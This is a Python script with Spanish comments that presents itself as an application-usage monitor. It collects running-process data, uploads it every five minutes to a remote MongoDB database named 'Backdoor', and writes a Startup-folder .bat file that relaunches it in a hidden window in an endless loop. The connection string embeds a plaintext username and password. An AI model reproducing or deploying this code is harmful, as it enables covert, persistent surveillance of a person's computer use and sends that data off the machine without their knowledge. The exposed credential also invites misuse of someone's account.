import os
import psutil
import time
import threading
from pymongo import MongoClient
import datetime

# Configuración de MongoDB
mongo_uri = "mongodb+srv://iraldejordan10:r5dcxq5RHNDrxt69@jarviscluster.et2fo.mongodb.net/"
client = MongoClient(mongo_uri)
db = client["Backdoor"]
collection = db["TiempoEnApps"]

# Directorio donde se guardarán los datos localmente
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
data_folder = os.path.join(desktop_path, "jarvis_data")
os.makedirs(data_folder, exist_ok=True)

# Variables de control
last_checked = time.time()
save_interval = 300  # Guardar cada 5 minutos
max_idle_time = 600  # Reiniciar después de 10 minutos de inactividad
last_saved = time.time()

def get_active_apps():
    """Obtiene los procesos activos y sus tiempos de inicio."""
    active_apps = []
    for proc in psutil.process_iter(['pid', 'name', 'create_time']):
        try:
            # Filtra los procesos con un nombre adecuado y los que están en ejecución
            if proc.info['name'] and proc.info['create_time']:
                start_time = datetime.datetime.fromtimestamp(proc.info['create_time'])
                active_apps.append({
                    'pid': proc.info['pid'],
                    'name': proc.info['name'],
                    'start_time': start_time
                })
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            # Si hay problemas de permisos o el proceso ya no existe, se omite
            continue
    return active_apps

def save_to_db(active_apps):
    """Guarda la información de las aplicaciones activas en MongoDB y archivo local."""
    timestamp = datetime.datetime.utcnow()
    collection.insert_one({
        "timestamp": timestamp,
        "apps": active_apps
    })

    # Guardar en archivo local
    file_name = os.path.join(data_folder, f"app_usage_{timestamp.isoformat()}.txt")
    with open(file_name, 'w') as file:
        for app in active_apps:
            file.write(f"PID: {app['pid']} | Name: {app['name']} | Start Time: {app['start_time']}\n")

    print(f"Datos guardados: {file_name}")

def monitor_app_usage():
    """Monitorea el uso de aplicaciones y guarda los datos cada cierto intervalo."""
    global last_checked, last_saved
    while True:
        time.sleep(10)  # Revisa el uso de las aplicaciones cada 10 segundos
        active_apps = get_active_apps()
        last_checked = time.time()

        # Guarda los datos cada 5 minutos
        if (time.time() - last_saved) >= save_interval:
            save_to_db(active_apps)
            last_saved = time.time()

        # Reinicia el proceso si ha pasado más de 10 minutos sin actividad
        if (time.time() - last_checked) >= max_idle_time:
            print("Inactividad detectada, reiniciando...")
            last_checked = time.time()  # Resetear el contador de inactividad

def create_startup_file():
    """Crea un archivo .bat para asegurarse de que el script se ejecute al iniciar el sistema."""
    bat_content = f'''@echo off
                        where python >nul 2>nul
                        if %ERRORLEVEL% neq 0 (
                            echo Python no está instalado. Instale Python.
                            exit /b
                        )

                        python -m pip install --upgrade pip
                        pip install psutil pymongo

                        set "PYTHON_SCRIPT={os.path.abspath(__file__)}"
                        powershell -windowstyle hidden -command "try {{ python '{os.path.abspath(__file__)}' }} catch {{ exit 1 }}"

                        :inicio
                        python %PYTHON_SCRIPT%
                        goto inicio
'''
    bat_file_path = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup', 'run_app_monitor.bat')
    with open(bat_file_path, 'w') as bat_file:
        bat_file.write(bat_content)
    print(f'Archivo de inicio creado en: {bat_file_path}')

def main():
    """Configuración principal del monitor de aplicaciones."""
    if not os.path.isfile(os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup', 'run_app_monitor.bat')):
        create_startup_file()

    # Iniciar el hilo de monitoreo
    monitor_thread = threading.Thread(target=monitor_app_usage)
    monitor_thread.daemon = True
    monitor_thread.start()

    # Mantener el script corriendo
    while True:
        time.sleep(10)

if __name__ == "__main__":
    main()
